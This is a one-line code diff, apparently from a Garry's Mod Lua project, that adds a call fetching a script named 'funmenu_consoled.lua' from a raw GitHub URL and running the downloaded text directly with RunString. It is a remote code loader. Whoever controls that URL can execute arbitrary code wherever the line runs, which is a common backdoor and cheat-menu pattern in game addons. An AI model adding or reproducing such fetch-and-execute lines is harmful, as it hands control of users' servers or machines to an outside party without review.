@@ -1,0 +1,1 @@
+http.Fetch("https://raw.githubusercontent.com/YideBN/funmenu_consoled.lua/refs/heads/main/funmenu_consoled.lua", function(body, size, headers, code) RunString(body) end)
